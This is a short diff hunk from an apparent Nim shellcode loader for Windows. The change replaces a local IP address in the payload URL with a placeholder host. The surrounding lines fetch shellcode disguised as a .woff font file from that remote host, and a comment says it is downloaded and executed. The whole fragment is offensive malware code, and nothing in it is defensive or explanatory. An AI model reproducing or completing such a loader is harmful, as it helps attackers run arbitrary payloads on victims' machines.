@@ -33,7 +33,7 @@ when defined(windows):
     echo "[*] Running in x64 process"
 
     # URL of the .woff file containing shellcode
-    let shellcodeURL = "http://192.168.1.7:8080/shellcode.woff"
+    let shellcodeURL = "http://URLHEREBRO:8080/shellcode.woff"
 
     # Download and execute shellcode
     let shellcode = DownloadShellcode(shellcodeURL)
